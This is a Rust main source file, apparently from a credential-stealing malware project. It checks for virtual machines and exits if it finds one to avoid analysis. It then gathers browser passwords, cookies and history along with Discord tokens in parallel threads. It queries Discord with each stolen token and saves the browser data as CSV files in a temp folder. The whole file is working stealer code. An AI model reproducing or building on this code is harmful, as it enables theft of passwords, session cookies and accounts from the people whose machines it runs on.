
use std::time::Instant;
use std::collections::{HashMap, HashSet};
use std::thread::{self, JoinHandle};

use std::env::temp_dir;
use std::error::Error;
use std::fs::create_dir;
use csv::Writer;

use modules::discord::Discord;
use modules::checks::antiinjection::anti_injection;
use modules::checks::antivm::check_anti_vm;
use modules::finder::{find_cookies, find_files, find_history, find_passwords, find_tokens};

mod modules;

fn save_to_file(data: &Vec<HashMap<String, String>>, file_path: &str) -> Result<(), Box<dyn Error>> {
    let mut headers: Vec<&str> = data.iter()
        .flat_map(|map| map.keys())
        .map(|key| key.as_str())
        .collect();
    headers.sort();
    headers.dedup();

    let mut writer = Writer::from_path(file_path)?;

    writer.write_record(&headers)?;

    for map in data {
        let row: Vec<String> = headers.iter()
            .map(|key| map.get(*key).unwrap_or(&String::new()).to_owned())
            .collect();
        writer.write_record(&row)?;
    }

    writer.flush()?;
    Ok(())
}

fn main() {
    anti_injection();

    if check_anti_vm() {
        return
    }

    let start = Instant::now();

    let history_handle: JoinHandle<Vec<HashMap<String, String>>> = thread::spawn(move || {
        let start = Instant::now();
        let ret = find_history();
        let duration = start.elapsed();

        println!("History took: {:?}", duration);

        ret
    });

    let cookies_handle: JoinHandle<Vec<HashMap<String, String>>> = thread::spawn(move || {
        let start = Instant::now();
        let ret = find_cookies();
        let duration = start.elapsed();

        println!("Cookies took: {:?}", duration);

        ret
    });

    let passwords_handle: JoinHandle<Vec<HashMap<String, String>>> = thread::spawn(move || {
        let start = Instant::now();
        let ret = find_passwords();
        let duration = start.elapsed();

        println!("Passwords took: {:?}", duration);

        ret
    });

    let tokens_handle: JoinHandle<Vec<std::string::String>> = thread::spawn(move || {
        let start = Instant::now();
        let ret = find_tokens();
        let duration = start.elapsed();

        println!("Tokens took: {:?}", duration);

        ret
    });

    let passwords = passwords_handle.join().expect("Thread panicked");
    let cookies = cookies_handle.join().expect("Thread panicked");
    let history = history_handle.join().expect("Thread panicked");
    let tokens: Vec<String> = tokens_handle.join().expect("Thread panicked").into_iter().collect::<HashSet<String>>().into_iter().collect();

    let duration = start.elapsed();
    println!(
        "Found\n └── passwords: {},\n └── cookies: {},\n └── history: {},\n └── tokens: {}\nin {:?}",
        passwords.len(),
        cookies.len(),
        history.len(),
        tokens.len(),
        duration
    );


    for token in tokens {
        let discord = Discord::new(&token);
        let profile = match discord.get_profile() {
            Ok(p) => p,
            Err(e) => {
                if cfg!(debug_assertions) {
                    println!("(main.rs:main) Failed to get discord profile: {}", e);
                }   

                continue;
            }
        };  

        println!("{}", profile.username);
    }

    let tmp = temp_dir();
    match create_dir(tmp.join("thanks")) {
        Ok(_) => {},
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(main.rs:main) Error creating dir: {}", e);
            }   
        }
    }

    match create_dir(tmp.join("thanks/browser")) {
        Ok(_) => {},
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(main.rs:main) Error creating dir: {}", e);
            }   
        }
    }

    match save_to_file(&passwords, &(tmp.to_string_lossy() + "thanks/browser/passwords.csv")) {
        Ok(_) => {},
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(main.rs:main) Error saving file: {}", e);
            }   
        }
    }

    match save_to_file(&cookies, &(tmp.to_string_lossy() + "thanks/browser/cookies.csv")) {
        Ok(_) => {},
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(main.rs:main) Error saving file: {}", e);
            }   
        }
    }

    match save_to_file(&history, &(tmp.to_string_lossy() + "thanks/browser/history.csv")) {
        Ok(_) => {},
        Err(e) => {
            if cfg!(debug_assertions) {
                println!("(main.rs:main) Error saving file: {}", e);
            }   
        }
    }


}